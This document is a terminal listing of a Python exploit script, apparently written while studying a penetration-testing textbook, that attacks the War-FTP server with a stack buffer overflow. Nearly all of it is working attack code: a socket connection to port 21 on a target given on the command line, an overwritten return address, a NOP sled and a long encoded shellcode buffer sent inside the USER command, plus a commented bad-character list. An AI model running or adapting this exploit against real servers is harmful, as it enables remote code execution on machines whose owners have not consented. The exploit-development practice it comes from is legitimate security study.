┌──(youfan-macos㉿kali)-[~/Documents/Binary-exploit]
└─$ cat new-war-ftp.py                                                                                                                           
#!/usr/bin/python3

import socket
import sys
# Author: Yufan Limbu
# Reference from Georgia weidmen book Penetration Testing: A Hands-On Introduction to hacking
# Copy of War ftp can be found on a exploit db 
# War-ftp is shared below 
# 
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection = sock.connect((sys.argv[1],21))
eip = b'\xF7\x5A\x45\x7E' 
nop = b'\x90'*20
#bad_char = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d
#\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f
#\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55
#\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b
#\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82
#\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c
#\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7
#\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2
#\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef
#\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
buf =  b""
buf += b"\xdb\xd2\xd9\x74\x24\xf4\x5d\xb8\xab\xa8\xfd\xad\x2b"
buf += b"\xc9\xb1\x59\x31\x45\x19\x03\x45\x19\x83\xc5\x04\x49"
buf += b"\x5d\x01\x45\x02\x9e\xfa\x96\x7c\x16\x1f\xa7\xae\x4c"
buf += b"\x6b\x9a\x7e\x06\x39\x17\xf5\x4a\xaa\xac\x7b\x43\xdd"
buf += b"\x05\x31\xb5\xd0\x96\xf4\x79\xbe\x55\x97\x05\xbd\x89"
buf += b"\x77\x37\x0e\xdc\x76\x70\xd8\xaa\x97\x2c\x8c\xdf\x35"
buf += b"\xc1\xb9\xa2\x85\xe0\x6d\xa9\xb5\x9a\x08\x6e\x41\x17"
buf += b"\x12\xbf\x22\xef\x0c\x6f\xbf\xa8\x0c\x8e\x6c\xcd\x84"
buf += b"\xe4\xae\xff\xe9\x4c\x45\xcb\x9e\x4e\x8f\x05\x61\x91"
buf += b"\xe0\x6b\xcd\x13\x39\x4b\xed\x61\x31\xaf\x90\x71\x82"
buf += b"\xcd\x4e\xf7\x14\x75\x04\xaf\xf0\x87\xc9\x36\x73\x8b"
buf += b"\xa6\x3d\xdb\x88\x39\x91\x50\xb4\xb2\x14\xb6\x3c\x80"
buf += b"\x32\x12\x64\x52\x5a\x03\xc0\x35\x63\x53\xac\xea\xc1"
buf += b"\x18\x5f\xfc\x76\xe1\x9f\x01\x2b\x75\x53\xcc\xd4\x85"
buf += b"\xfb\x47\xa6\xb7\xa4\xf3\x20\xfb\x2d\xda\xb7\x8a\x3a"
buf += b"\xdd\x68\x34\x2a\x23\x89\x44\x62\xe0\xdd\x14\x1c\xc1"
buf += b"\x5d\xff\xdc\xee\x8b\x95\xd6\x78\x3e\x69\xed\x7f\x56"
buf += b"\x6b\xf1\x6e\xfa\xe2\x17\xc0\x52\xa4\x87\xa1\x02\x04"
buf += b"\x78\x4a\x49\x8b\xa7\x6a\x72\x46\xc0\x01\x9d\x3e\xb8"
buf += b"\xbd\x04\x1b\x32\x5f\xc8\xb6\x3e\x5f\x42\x32\xbe\x2e"
buf += b"\xa3\x37\xac\x47\xd4\xb7\x2c\x98\x71\xb7\x46\x9c\xd3"
buf += b"\xe0\xfe\x9e\x02\xc6\xa0\x61\x61\x55\xa6\x9e\xf4\x6f"
buf += b"\xdc\xa9\x62\xcf\x8a\xd5\x62\xcf\x4a\x80\xe8\xcf\x22"
buf += b"\x74\x49\x9c\x57\x7b\x44\xb1\xcb\xee\x67\xe3\xb8\xb9"
buf += b"\x0f\x09\xe6\x8e\x8f\xf2\xcd\x8c\xc8\x0c\x93\xba\x70"
buf += b"\x64\x6b\xfb\x80\x74\x01\xfb\xd0\x1c\xde\xd4\xdf\xec"
buf += b"\x1f\xff\xb7\x64\x95\x6e\x75\x15\xaa\xba\xdb\x8b\xab"
buf += b"\x49\xc0\x3c\xd1\x22\xf7\xbd\x26\x2b\x9c\xbe\x26\x53"
buf += b"\xa2\x83\xf0\x6a\xd0\xc2\xc0\xc8\xeb\x71\x64\x78\x66"
buf += b"\x79\x3a\x7a\xa3"
c = b'C'*450
payload = b'A'*485+ eip + b'C'*4 +b"\x81\xc4\x24\xfa\xff\xff" + nop + buf
z = sock.recv(1024)
print(z)
sock.send(b'USER ' + payload + b'\r\n')
z1 = sock.recv(1024)
print(z1)
sock.send(b'PASS PASSWORD\r\n')
sock.close()

